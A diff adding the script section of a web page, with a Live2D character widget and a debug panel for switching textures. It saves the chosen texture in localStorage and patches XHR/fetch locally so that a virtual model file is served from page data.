+            style="margin-top: 10px; width: 100%; background: transparent; color: #ff0000; border: 1px solid #ff0000; padding: 5px; cursor: pointer;">CLOSE</button>
+    </div>
+
+    <!-- Toggle Button -->
+    <button id="toggle-debug"
+        style="position: fixed; bottom: 20px; left: 20px; background: rgba(0,0,0,0.5); color: #0f0; border: 1px solid #0f0; padding: 5px 10px; cursor: pointer; z-index: 9998; font-family: 'Share Tech Mono', monospace;">
+        DEBUG
+    </button>
+
+
+    <script>
+        // Live2D Configuration
+        const baseModelConfig = {
+            "model": {
+                "jsonPath": "../assets/live2d/pio/model.json",
+                "scale": 1
+            },
+            "display": {
+                "position": "right",
+                "width": 300,
+                "height": 600,
+                "hOffset": 0,
+                "vOffset": -180
+            },
+            "mobile": {
+                "show": true,
+                "scale": 0.5
+            },
+            "react": {
+                "opacityDefault": 0.7,
+                "opacityOnHover": 0.2
+            }
+        };
+
+        // Adjust for mobile to prevent floating
+        if (window.innerWidth < 768) {
+            baseModelConfig.display.vOffset = -250; // Balanced for mobile (not too high, not too low)
+            baseModelConfig.display.hOffset = -80; // Slight left adjustment
+        }
+
+        // Initialize default widget
+        // L2Dwidget.init(baseModelConfig); // Commented out to prevent double-loading. initLive2D handles this.
+
+        // Debug Panel Logic
+        const debugPanel = document.getElementById('l2d-debug-panel');
+        const toggleBtn = document.getElementById('toggle-debug');
+        const closeBtn = document.getElementById('close-debug');
+        const textureSelect = document.getElementById('texture-select');
+        const applyBtn = document.getElementById('apply-texture');
+        let modelData = null;
+
+        // Toggle Visibility
+        toggleBtn.addEventListener('click', () => {
+            debugPanel.style.display = 'block';
+            toggleBtn.style.display = 'none';
+            if (!modelData) loadTextureList();
+        });
+
+        closeBtn.addEventListener('click', () => {
+            debugPanel.style.display = 'none';
+            toggleBtn.style.display = 'block';
+        });
+
+        // Load Textures from model.json
+        async function loadTextureList() {
+            try {
+                const response = await fetch('../assets/live2d/pio/model.json');
+                modelData = await response.json(); // Keep modelData for other uses if any
+
+                // Fetch available textures from external JSON
+                await fetch('../assets/live2d/pio/textures.json')
+                    .then(response => response.json())
+                    .then(textures => {
+                        textureSelect.innerHTML = ''; // Clear existing options
+                        textures.forEach((tex, index) => {
+                            const opt = document.createElement('option');
+                            opt.value = tex;
+                            // Extract readable name
+                            // e.g., "textures/Cake Costume Cream.png" -> "Cake Costume Cream"
+                            const name = tex.split('/').pop().replace('.png', '');
+                            opt.textContent = `${index}: ${name}`;
+                            textureSelect.appendChild(opt);
+                        });
+                    })
+                    .catch(err => {
+                        console.error('Failed to load texture list:', err);
+                        textureSelect.innerHTML = '<option>Error loading textures</option>';
+                    });
+
+            } catch (error) {
+                console.error('Failed to load model.json:', error);
+                // If model.json fails, modelData will be null, but texture list loading is separate now.
+            }
+        }
+
+        // Network Interceptor for Dynamic Loading
+        (function () {
+            const originalOpen = XMLHttpRequest.prototype.open;
+            const originalSend = XMLHttpRequest.prototype.send;
+
+            XMLHttpRequest.prototype.open = function (method, url) {
+                this._url = url;
+                return originalOpen.apply(this, arguments);
+            };
+
+            XMLHttpRequest.prototype.send = function (body) {
+                if (this._url && typeof this._url === 'string' && this._url.includes('model_dynamic.json')) {
+                    console.log('Intercepted XHR for dynamic model:', this._url);
+
+                    // Delay execution to simulate network processing and ensure responseType is set
+                    setTimeout(() => {
+                        const data = window.currentModelData;
+                        if (!data) {
+                            console.error('Interceptor Error: window.currentModelData is missing!');
+                            // Simulate error
+                            Object.defineProperty(this, 'status', { writable: true, value: 404 });
+                            Object.defineProperty(this, 'statusText', { writable: true, value: 'Not Found' });
+                            Object.defineProperty(this, 'readyState', { writable: true, value: 4 });
+                            this.dispatchEvent(new Event('error'));
+                            return;
+                        }
+
+                        const jsonString = JSON.stringify(data);
+                        console.log('Interceptor: serving data for', this._url, 'responseType:', this.responseType);
+
+                        Object.defineProperty(this, 'readyState', { writable: true, value: 4 });
+                        Object.defineProperty(this, 'status', { writable: true, value: 200 });
+                        Object.defineProperty(this, 'statusText', { writable: true, value: 'OK' });
+
+                        // Handle responseType
+                        if (this.responseType === 'json') {
+                            Object.defineProperty(this, 'response', { writable: true, value: data });
+                            // responseText is not accessible when responseType is json
+                        } else if (this.responseType === 'arraybuffer') {
+                            const encoder = new TextEncoder();
+                            const buffer = encoder.encode(jsonString).buffer;
+                            Object.defineProperty(this, 'response', { writable: true, value: buffer });
+                        } else {
+                            Object.defineProperty(this, 'response', { writable: true, value: jsonString });
+                            Object.defineProperty(this, 'responseText', { writable: true, value: jsonString });
+                        }
+
+                        this.dispatchEvent(new Event('load'));
+                        if (this.onreadystatechange) this.onreadystatechange();
+                        if (this.onload) this.onload();
+                    }, 10);
+                    return;
+                }
+                return originalSend.apply(this, arguments);
+            };
+
+            const originalFetch = window.fetch;
+            window.fetch = async (url, options) => {
+                if (url && typeof url === 'string' && url.includes('model_dynamic.json')) {
+                    console.log('Intercepted Fetch for dynamic model');
+                    if (!window.currentModelData) {
+                        return new Response("Not Found", { status: 404 });
+                    }
+                    return new Response(JSON.stringify(window.currentModelData), {
+                        status: 200,
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                }
+                return originalFetch(url, options);
+            };
+        })();
+
+        // Preference Persistence
+        function savePreference(key, value) {
+            localStorage.setItem(key, value);
+        }
+
+        function loadPreference(key) {
+            return localStorage.getItem(key);
+        }
+
+        async function initLive2D() {
+            // Load texture list first
+            await loadTextureList();
+
+            // Check for saved preference
+            const savedTexture = loadPreference('live2d-texture');
+
+            if (savedTexture && modelData) {
+                console.log("Found saved texture preference:", savedTexture);
+                // We need to fetch the base model config to create the dynamic one
+                try {
+                    // Reuse loaded modelData instead of fetching again
+                    const baseConfig = modelData;
+
+                    // Create dynamic config
+                    const newModelData = JSON.parse(JSON.stringify(baseConfig));
+                    newModelData.textures = [savedTexture];
+                    window.currentModelData = newModelData;
+
+                    const timestamp = Date.now();
+                    const virtualPath = `../assets/live2d/pio/model_dynamic.json?t=${timestamp}`;
+
+                    const config = { ...baseModelConfig };
+                    config.model.jsonPath = virtualPath;
+
+                    L2Dwidget.init(config);
+
+                    // Set dropdown value if it exists
+                    // We need to wait for dropdown to populate, but loadTextureList is awaited above
+                    // However, we need to match the value exactly
+                    if (textureSelect) {
+                        textureSelect.value = savedTexture;
+                    }
+
+                } catch (e) {
+                    console.error("Failed to load saved preference, falling back to default.", e);
+                    L2Dwidget.init(baseModelConfig);
+                }
+            } else {
+                // Default initialization
+                L2Dwidget.init(baseModelConfig);
+            }
+        }
+
+        // Apply Selected Texture
+        applyBtn.addEventListener('click', () => {
+            const selectedTexture = textureSelect.value;
+            if (!selectedTexture || !modelData) return;
+
+            // Create a modified model config
+            // Use deep clone
+            const newModelData = JSON.parse(JSON.stringify(modelData));
+
+            // Set the selected texture
+            newModelData.textures = [selectedTexture];
+
+            // Store globally for interceptor
+            window.currentModelData = newModelData;
+
+            // Destroy existing widget
+            const existingWidget = document.getElementById('live2d-widget');
+            if (existingWidget) existingWidget.remove();
+
+            // Re-initialize with virtual path
+            // The path must allow relative resolution to ../assets/live2d/pio/
+            const timestamp = Date.now();
+            const virtualPath = `../assets/live2d/pio/model_dynamic.json?t=${timestamp}`;
+
+            const newConfig = { ...baseModelConfig };
+            newConfig.model.jsonPath = virtualPath;
+
+            console.log("Loading texture:", selectedTexture);
+            console.log("Loading virtual config:", virtualPath);
+
+            // Save preference
+            savePreference('live2d-texture', selectedTexture);
+
+            L2Dwidget.init(newConfig);
+        });
+
+        // Robust initialization with retry logic for mobile browsers
+        let initAttempts = 0;
+        const maxAttempts = 10;
+        const retryDelay = 300; // milliseconds
+        let isInitializing = false; // Flag to prevent multiple concurrent initializations
+
+        function tryInitializeLive2D() {
+            if (isInitializing) return; // Prevent concurrent calls
+            initAttempts++;
+
+            // Check if library is fully loaded and ready
+            if (typeof L2Dwidget !== 'undefined' && typeof L2Dwidget.init === 'function') {
+                console.log(`Live2D initialized successfully on attempt ${initAttempts}`);
+                isInitializing = true;
+                initLive2D();
+            } else if (initAttempts < maxAttempts) {
+                console.log(`Live2D not ready, retrying... (attempt ${initAttempts}/${maxAttempts})`);
+                setTimeout(tryInitializeLive2D, retryDelay * initAttempts); // Exponential backoff
+            } else {
+                console.error("Failed to initialize Live2D after multiple attempts. Library may not be loaded.");
+            }
+        }
+
+        // Try initialization when DOM is ready
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', tryInitializeLive2D);
+        } else {
+            // DOM already loaded
+            tryInitializeLive2D();
+        }
+
+        // Fallback: ensure initialization on window load
+        window.addEventListener('load', () => {
+            // Check if already initialized (using isInitializing flag) OR check DOM presence
+            if (!isInitializing && (initAttempts === 0 || (typeof L2Dwidget !== 'undefined' && !document.getElementById('live2d-widget')))) {
+                console.log("Triggering Live2D init from window.onload");
+                tryInitializeLive2D();
+            }
+        });
+    </script>
+
+</body>
+
+</html>
